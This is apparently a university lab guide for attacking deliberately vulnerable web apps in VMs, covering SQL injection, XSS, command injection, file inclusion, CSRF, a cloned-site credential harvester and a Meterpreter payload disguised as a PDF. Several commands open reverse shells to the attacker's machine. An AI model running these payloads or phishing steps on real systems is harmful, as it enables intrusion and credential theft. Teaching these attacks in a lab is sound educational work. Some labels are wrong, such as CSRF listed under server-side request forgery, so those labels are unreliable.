@@ -1,0 +1,437 @@
+ Getting to Know Web Applications
+The lab utilizes three vulnerable web applications:
+
+1.1 Damn Vulnerable Web Application (DVWA)
+Important: Use the DVWA instance running on the OWASP Virtual Machine at http://192.168.56.101/dvwa/.
+Do NOT use the dvwa.local instance on the Kali VM.
+Credentials: Username: admin, Password: admin.
+1.2 OWASP WebGoat
+A vulnerable application with structured lessons and challenges.
+Available as a Docker container on Kali Linux, running on port 8082.
+Access: webgoat.local or http://127.0.0.1:8082/WebGoat.
+Credentials: Username: webgoat, Password: webgoat.
+1.3 OWASP Security Shepherd
+Another vulnerable application covering OWASP vulnerabilities.
+Available on the OWASP VM.
+Access: http://192.168.56.101/shepherd/.
+Credentials: Username: admin, Password: password. (No need to change them).
+1.1 BurpSuite and FoxyProxy
+These tools are used for intercepting and manipulating web traffic.
+
+FoxyProxy (on Kali browser):
+Allows redirection of traffic to Burp Suite proxy.
+Enable: Click FoxyProxy plugin button, select "BurpSuite proxy (7070)". The plugin icon turns green.
+Disable: Select "Disable".
+BurpSuite (on Kali):
+Start: Open Kali menu, type burpsuite, or navigate to 03- Web Application Analysis > burpsuite.
+Configure Proxy:
+Select Proxy tab.
+Click Proxy settings.
+Select the proxy 127.0.0.1:8080.
+Click Edit.
+Change the value to 7070.
+Click Ok.
+OWASP Top 10 Overview
+OWASP (Open Worldwide Application Security Project) classifies web vulnerabilities.
+The latest OWASP Top 10 list was published in 2021, with the next update planned for the first half of 2025.
+Lab Focus Areas (OWASP Top 10 2021):
+A3-Injection: Includes SQL Injection and Cross-Site Scripting (XSS, formerly A7 in 2017).
+A2-Cryptographic Failure.
+A7-Identification and Authentication Failures.
+A8-Software and Data Integrity Failures.
+2 (A3) Injection
+2.1 Exploiting SQL Vulnerabilities
+SQL Injection (SQLi) abuses communication between an application and its database by injecting SQL commands into user inputs.
+
+VMs Needed: Kali Linux and DVWA on OWASP VM.
+Activity: Browse DVWA, login, select "SQL Injection".
+1. SQL Queries Recap
+
+A form asking for User ID typically composes a query like: $query = "SELECT * FROM users WHERE id='" . $_GET['id'] . "'";
+The id parameter from the URL is directly concatenated.
+Normal Behavior Test: Enter 1 in User ID. The application returns user details for ID 1.
+Resulting query: $query = "SELECT * FROM users WHERE id='" . "1" . "'";
+2. Identify if Vulnerable to SQL Injection
+
+Test 1: Enter 1' (unexpected apostrophe).
+Result: Database throws a syntax error, e.g., 1''. This indicates unsafe user input processing.
+Test 2: Enter 1" (two apostrophes).
+Result: No error. Suggests different handling, but doesn't confirm SQLi yet.
+Test 3 (Basic SQL Injection Attack): Enter ' or "1"="1 in the text box.
+Interpreted Query: $query = "SELECT * FROM users WHERE id=' or 1=1
+Result: Application returns all users because '1'='1' is always true. The first apostrophe closes the original one, and the final apostrophe uses the existing one in the query.
+3. Exploit Error-Based SQL Injection Vulnerability
+
+Goal: Extract information from the database.
+
+Using Hackbar:
+
+Open Developer Tools (F12). Hackbar is the last tab.
+Click Load URL to populate the current URL.
+Click Split URL to separate parameters (makes id parameter visible).
+The Execute button sends modified parameters.
+Identifying Number of Columns (order by):
+
+Input: 1' order by 1--
+Result: Returns user ID 1, sorted by column 1.
+Process: Increment the number (1' order by 2--, 1' order by 3--) until an error occurs.
+Example: 1' order by 3-- causes an error if only two columns exist. This confirms the query has two columns.
+Using union select to Extract Information:
+
+Input: 1' union select 1,2
+Result: Returns two results, joining values from column 1 and 2 for User ID 1. Confirms two values can be requested.
+Obtaining DBMS Version and Database User (@@version, current_user()):
+
+Input: 1' union select @@version, current_user()
+Result: Provides current_user() (e.g., admin) and @@version (e.g., 5.1.41-3ubuntu12.6).
+Finding Table Names (information_schema.tables):
+
+Input: 1' union select table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%'
+Result: Returns table names like users, USER_PRIVILEGES, USER_STATISTICS, and the database name (dvwa). This identifies the users table.
+Enumerating Columns in the users Table (information_schema.columns):
+
+Input: 1 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name = 'users'
+Result: Returns column names: user_id, first_name, last_name, user, password, avatar, last_login, failed_login.
+Retrieving Usernames and Passwords:
+
+Input: 1' union select user, password FROM dvwa.users
+Result: Displays usernames and their hashed passwords from the users table in the dvwa schema.
+4. Cracking Found Hashes
+
+Store Hashes:
+
+Open a text editor (e.g., nano hashes.lst or mousepad hashes.lst).
+Save usernames and hashes in username:hash format, one record per line. Example: admin:21232f297a57a5a743894a0e4a801fc3.
+Store the file on the Desktop (cd ~/Desktop).
+Crack Hashes using John the Ripper:
+
+Kali contains wordlists in /usr/share/wordlists.
+Extract Rock You Wordlist: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+Crack Command: john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 ~/Desktop/hashes.lst
+--wordlist: Specifies the dictionary file.
+--format: Specifies the hashing algorithm (e.g., raw-md5). John can auto-guess if omitted.
+View Cracked Passwords: john --show --format=raw-md5 ~/Desktop/hashes.lst
+This command displays all cracked passwords, including those not shown in the initial output.
+Using Rules: john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 ~/Desktop/hashes.lst --rules
+The --rules flag tries different combinations of words from the wordlist.
+Clear John's Session Data: rm ~/.john/john.* (if you want to rerun and see all outputs).
+2.2 Cross Site Scripting (XSS)
+XSS is a common vulnerability where malicious scripts are injected into otherwise trusted websites. It is part of the Injection category in OWASP Top 10 2021.
+
+VMs Needed: Kali Linux VM and OWASP VM.
+1. Identifying Cross-Site Scripting (XSS) Vulnerabilities
+
+On DVWA (Reflected XSS):
+
+Open DVWA on OWASP VM, select "XSS Reflected".
+Enter a name and submit. Observe normal response.
+Test Input: <'this is my XSS test'>
+Result: The input is reflected in the HTML response.
+View Page Source to analyze how input is presented.
+Injection Test: <script>alert('Vulnerable to XSS')</script>
+Result: If an alert box pops up, it confirms XSS vulnerability.
+On OWASP Security Shepherd:
+
+Open Firefox, browse to OWASP Security Shepherd (http://192.168.56.101/shepherd/).
+Login (admin/password).
+Select "Lessons" > "Cross Site Scripting".
+Injection Test: <script>alert('Vulnerable to XSS')</script>
+Observation: If this allows code execution, it's vulnerable. The < and > symbols should ideally be filtered.
+Different XSS Injection Methods:
+
+Direct script injection: <SCRIPT>alert('XSS')</SCRIPT> (runs immediately)
+Image error event: <IMG SRC="#" ONERROR="alert('XSS')" /> (runs when image fails to load)
+Button click event: <INPUT TYPE="BUTTON" ONCLICK="alert('XSS')" /> (runs when button is clicked)
+JavaScript URI in an iframe: <IFRAME SRC="javascript:alert('XSS');"></IFRAME> (runs when iframe loads)
+Attackers try different methods if one fails due to varied sanitization.
+2. Exploit Different Types of XSS
+
+Activity: On Security Shepherd, go to "Challenges" > "XSS" > "Cross Site Scripting 1".
+
+Initial Test: Enter <script>alert('Vulnerable to XSS')</script> in the search term.
+
+Result: Simple "Search Error" message. Indicates data sanitization.
+Using BurpSuite to Analyze Filtering:
+
+Ensure BurpSuite is running and configured with FoxyProxy (port 7070).
+Submit the same XSS input: <script>alert('Vulnerable to XSS')</script>
+In BurpSuite, go to Proxy tab, then HTTP history.
+Select the relevant POST message.
+Request Header: Examine the input.
+Response Header: Observe the error. Discovery: The word "script" is being filtered by removing the 'i' (e.g., scrpt). This prevents the tag from working.
+Bypassing the Filter:
+
+New Injection: <IMG SRC="#" ONERROR="alert('Vulnerable to XSS')"/>
+This introduces an HTML image element with an empty source, triggering the ONERROR JavaScript attribute.
+Result: The XSS injection is successful, and the alert box appears.
+Verify the successful injection in BurpSuite's response.
+2.3 Exploiting OS Command Injections
+OS Command Injection vulnerabilities occur when user input is used directly to form OS commands without proper validation.
+
+VMs Needed: Kali Linux VM and OWASP VM.
+
+Activity: Log into DVWA, go to "Command Execution".
+
+Initial Test: Enter 192.168.56.101 (OWASP VM IP) in the "Ping for FREE" form.
+
+Result: Output looks like a direct ping command output. Suggests the server is executing OS commands.
+Injecting a Simple Command:
+
+Input: 192.168.56.101;uname -a
+Result: The uname -a command output appears after the ping output. This confirms a command injection vulnerability.
+uname -a: Prints system information (kernel, hostname, etc.).
+Command without IP:
+
+Input: ;uname -a
+Result: Still works, confirming command execution is allowed without an IP.
+Retrieving Privileged Information:
+
+Input: ;cat /etc/group
+Result: Displays user groups and members, useful for identifying attack vectors.
+Obtaining a Reverse Shell via Netcat:
+
+Check for Netcat: ;ls /bin/nc*
+
+Result: If netcat or nc.traditional is listed, it's installed.
+Kali (Attacker Machine) - Setup Listener:
+
+Open a terminal on Kali.
+Command: nc -lp 1691 -v
+-l: Listen for incoming connections.
+-p 1691: Listen on port 1691.
+-v: Verbose mode.
+Browser (DVWA on OWASP VM) - Create Connection:
+
+Input: ;nc.traditional -e /bin/bash 192.168.56.102 1691 & (Replace 192.168.56.102 with Kali's IP address).
+nc.traditional: Specifies the traditional Netcat version supporting -e.
+-e /bin/bash: Executes /bin/bash when a connection is made, providing a remote shell.
+192.168.56.102: Kali's IP address.
+1691: Listening port on Kali.
+&: Runs the command in the background.
+Kali (Attacker Machine) - Interact with Shell:
+
+The Kali terminal running Netcat will show a connection.
+You can now issue non-interactive commands that execute on the OWASP VM. You have a shell.
+How it Works (Source Code Analysis):
+
+View the source code of the DVWA "Command Execution" page.
+PHP code:
+PHP
+
+<?php
+if( isset( $_POST[ 'submit' ] ) ) {
+$target = $_REQUEST[ 'ip' ];
+if (stristr(php_uname('s'), 'Windows NT')) {
+$cmd = shell_exec( 'ping ' . $target );
+echo '<pre>'.$cmd.'</pre>';
+} else {
+$cmd = shell_exec( 'ping -c 3 ' . $target );
+echo '<pre>'.$cmd.'</pre>';
+}
+}
+?>
+The $target (user input) is directly appended to the ping command. A semicolon (;) acts as a command separator in the shell, allowing the injection of additional commands.
+3 (A5) Security Misconfiguration
+3.1 Local File Inclusions (LFI)
+File inclusion vulnerabilities occur when user-modified request parameters dynamically choose files to load or include, potentially leading to system compromise.
+
+VMs Needed: Kali Linux VM and OWASP VM.
+
+Activity: Log into DVWA, go to "File Inclusion".
+
+Using Hackbar:
+
+Select Hackbar tab (F12).
+Click Load URL, then Split URL.
+Testing Inclusion:
+
+The default page parameter is include.php: http://192.168.56.101/dvwa/vulnerabilities/fi/?page=include.php.
+Change Parameter: Change ?page=include.php to ?page=index.php.
+Result: No index.php file found in that directory, indicating a possible LFI.
+Directory Traversal (../):
+
+Goal: Navigate to the index.php file in the parent dvwa folder.
+Concept: ../ moves one directory up in Linux.
+Input: ?page=../../index.php
+../: Exits fi folder.
+../: Exits vulnerabilities folder, landing in dvwa.
+Result: If index.php is displayed, LFI and directory traversal are possible.
+Reading System Files (/etc/passwd):
+
+Goal: Display contents of /etc/passwd (list of system users).
+File Location: /etc/passwd. Current location is /var/www/dvwa/vulnerabilities/fi.
+Input: ?page=../../../../../../etc/passwd (Use enough ../ to reach root /, then navigate to /etc).
+Result: The contents of /etc/passwd are displayed, confirming a security misconfiguration allowing navigation outside the web server folder.
+3.2 Remote File Inclusions (RFI)
+RFI occurs when a web application includes a file hosted on another server (e.g., the attacker's machine) instead of a local one.
+
+VMs Needed: Kali Linux VM and OWASP VM.
+
+Prepare Malicious File on Kali:
+
+Navigate to the module repository: cd ~/Desktop/6cosc019w
+Copy maliciousfile.php to Apache's web root: sudo cp maliciousfile.php /var/www/html/
+Ensure Apache is running on Kali (sudo service apache2 status/start).
+Exploiting RFI:
+
+Input: Change the page parameter in DVWA to the Kali's IP address and malicious file: ?page=http://192.168.56.102/maliciousfile.php
+Result: The application loads and executes the remote file. This confirms RFI.
+Impact: If the included file contains server-side executable code (like PHP), it will be executed, leading to remote command execution and potential system compromise.
+How it Works (Source Code Analysis):
+
+View the source code of the DVWA "File Inclusion" page.
+The page variable's parameter is directly passed to the filename and then included in the code.
+Vulnerability depends on allow_url_fopen and allow_url_include being enabled in the server's configuration. If only allow_url_fopen is enabled, it's only LFI.
+4 A10 Server-Side Request Forgery (CSRF)
+Cross-Site Request Forgery (CSRF) is an attack that tricks a user's browser into sending unauthorized requests to a trusted website, exploiting the user's authenticated session.
+
+VMs Needed: Kali Linux VM (using WebGoat and WebWolf).
+
+Activity: Open Kali browser, go to webgoat.local, login (webgoat/webgoat).
+
+Select "A10 Server-Side Request Forgery" > "Cross Site Request Forgeries".
+
+Basic Get CSRF Exercise:
+
+Read descriptions (1) and (2).
+Click "Submit Query" button on (3) "Basic Get CSRF Exercise".
+Result: Flag is null, success is false. Message: "Appears the request came from the original host". This indicates the request was not tampered with.
+Inspect Form Parameters (Developer Tools):
+
+Press F12 to open developer inspect mode, select "Network" tab.
+Reload the page.
+Select the POST message.
+Select "Request header".
+Observation: Parameters are csrf=false (WebGoat's CSRF protection check) and Submit-Query.
+Select "Response header". Flag is null, Success: false.
+Exploiting CSRF (Creating a Malicious Request):
+
+Goal: Create an HTML page to trick WebGoat into sending an unauthorized request from an external source, bypassing CSRF protection.
+The provided csrf.html file (in module repository) contains:
+A POST request to http://localhost:8080/WebGoat/csrf/basic-get-flag.
+Hidden input fields: csrf=false (to bypass protection) and submit=submit-Query.
+JavaScript: document.getElementById("csrfForm").submit(); (auto-submits the form when the page loads).
+Using WebWolf to Host the Malicious File:
+
+Click on "webWolf" bookmark (login webgoat/webgoat if prompted).
+Click "Files" in the WebWolf menu.
+On the upload page, browse and select ~/Desktop/6cosc019w/csrf.html.
+Click "Upload".
+Click on the uploaded csrf.html file.
+Click "Submit".
+Result: The CSRF attack is successful. A flag value (e.g., 41289) is displayed.
+Confirming the Flag:
+
+Go back to WebGoat CSRF attack page.
+Copy the obtained flag value into the "Confirm Flag Value" field.
+Click "Submit".
+Confirmation: Activity completion message.
+5 Social Engineering Attack Using a Cloned Website
+Social engineering attacks convince users to reveal information by tricking them into trusting the attacker.
+
+VMs Needed: Kali Linux VM and OWASP VM.
+5.1 Apache Setup
+Ensure Apache is Running:
+Check status: sudo service apache2 status
+Start if not running: sudo service apache2 start
+Verify by Browse to Kali's IP: http://192.168.56.102 (replace with your Kali IP).
+5.2 Using Social-Engineer Toolkit (SET)
+SET is a toolset for social engineering attacks, pre-installed on Kali.
+
+First-time Run: sudo setoolkit (accept terms, then exit or 99 to close). This creates necessary configuration files.
+
+Configure SET for Apache:
+
+Navigate to module repository: cd ~/Desktop/6cosc019w
+Make configset.sh executable: chmod a+x configset.sh
+Execute the script: sudo ./configset.sh (This replaces SET's default Python server config with Apache).
+You can ignore Python server errors as Apache is used.
+Create Credential Harvester:
+
+Start SET: sudo setoolkit
+Select 1 (Social-Engineering Attacks).
+Select 2 (Website Attack Vectors).
+Select 3 (Credential Harvester Attack Method).
+Select 2 (Site Cloner).
+IP address for POST back: Enter Kali's IP address (e.g., 192.168.56.102). This is where harvested credentials will be sent.
+URL to clone: Enter the target login page URL on OWASP VM (e.g., http://192.168.56.101/peruggia/index.php?action=login).
+Hit Enter again.
+Testing the Cloned Website:
+
+On the "victim" machine (another browser, ideally on OWASP VM or host), browse to Kali's IP address: http://192.168.56.102
+The cloned login page will appear.
+Enter a username and password (e.g., admin/admin).
+Observation: The page redirects to the original login page. The victim might assume they entered wrong credentials.
+View Harvested Credentials:
+
+Back on the Kali terminal where SET is running, you will see the entered username and password.
+SET also stores harvested credentials in text files in /var/www/html on Kali, named with "harvest" and a timestamp.
+What Happened: A fake website was created, and by luring the victim to it (e.g., via a malicious link), their credentials were captured before redirecting them to the genuine site.
+
+6 Phishing - Creating a Reverse Shell with Metasploit and Capturing its Connections
+This activity demonstrates a more advanced phishing attack using Metasploit to gain remote control of a victim's machine.
+
+VMs Needed: Kali Linux VM, OWASP VM, and a Windows VM (victim machine).
+Start Week: Week 9 onwards.
+6.1 Before You Start (Windows VM Setup)
+University Machines:
+In VirtualBox, go to File > Preferences.
+Change "Default Machine Folder" to C:\VirtualMachines.
+Downloading Windows VM:
+Access from CSE download page (home): https://download.cse.westminster.ac.uk/VirtualMachines/
+Access from Eduroam (on campus): http://10.20.144.78/download/VMs/
+Save the IE8-Win7.ova file to C:\VirtualMachines (or your desired folder).
+Deploying Windows 7 VM (.ova file):
+Double-click the .ova file and press "Finish" when prompted.
+Alternatively, in VirtualBox, File > Import Appliance (or Ctrl + I), browse to the .ova file, and import.
+Ensure the Windows VM network adapter is set to Host Only.
+6.2 Setting up the Windows VM and Metasploit Attack
+Create the Virus (Reverse Shell Payload) on Kali:
+
+Start msfconsole for the first time (sudo msfconsole), then exit -y. This generates payload lists.
+Open a terminal in Kali.
+Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4443 -f exe > studyguide.pdf.exe
+-p windows/meterpreter/reverse_tcp: Specifies the payload (Meterpreter reverse TCP shell for Windows).
+LHOST=192.168.56.102: Kali's IP address (the listener host).
+LPORT=4443: The listening port on Kali.
+-f exe: Output format is an executable.
+> studyguide.pdf.exe: Redirects output to this file name. This creates a simple virus that connects back to Kali.
+Host the Malicious File on Kali's Web Server:
+
+Ensure Apache is running (sudo service apache2 start).
+Copy the executable to Apache's web root: sudo cp studyguide.pdf.exe /var/www/html/
+Create a Phishing Webpage (Optional, but good practice):
+
+Copy a pre-created index.html from the module repository to Kali's web root: sudo cp ~/Desktop/6cosc019w/index.html /var/www/html/index.html
+Set Up Metasploit Listener (Handler) on Kali:
+
+Open a terminal and start msfconsole: sudo msfconsole -q
+Set the handler:
+use exploit/multi/handler (A general handler for various payloads).
+set payload windows/meterpreter/reverse_tcp (Must match the payload used in msfvenom).
+set lhost 192.168.56.102 (Kali's IP address).
+set lport 4443 (The listening port).
+set ExitOnSession false (Keeps msfconsole running after a session is established).
+set AutorunScript post/windows/manage/migrate (Migrates the Meterpreter shell to a more stable process automatically).
+Execute the Exploit: exploit -j -z
+-j: Runs the exploit as a job in the background.
+-z: Suppresses output.
+Victim Action (Windows VM):
+
+On the Windows VM, open a browser.
+Navigate to Kali's IP address: http://192.168.56.102/
+Click "Download Study Guide" (or whatever link you created).
+Choose to "run" or "download and run" the studyguide.pdf.exe file.
+Interact with the Session on Kali:
+
+Back in the msfconsole terminal on Kali, you should see the connection established.
+View sessions: sessions (Shows active sessions).
+Interact with a session: sessions -i <session_number> (e.g., sessions -i 1).
+You will now be in the meterpreter prompt.
+Gather system info: sysinfo
+Get a system shell (Command Line): shell
+You are now in control of the Windows machine via the reverse shell.
+How it Works
+msfvenom: Used to create custom payloads and incorporate them into executable files. Parameters define payload type, listener host/port, and output format.
+exploit/multi/handler: A Metasploit module used to listen for incoming connections from executed payloads.
+Meterpreter: A powerful Metasploit post-exploitation payload. It provides an advanced shell with capabilities like sniffing networks, pivoting, privilege escalation, password extraction, etc. The migrate script ensures persistence by moving the shell to a more stable process.
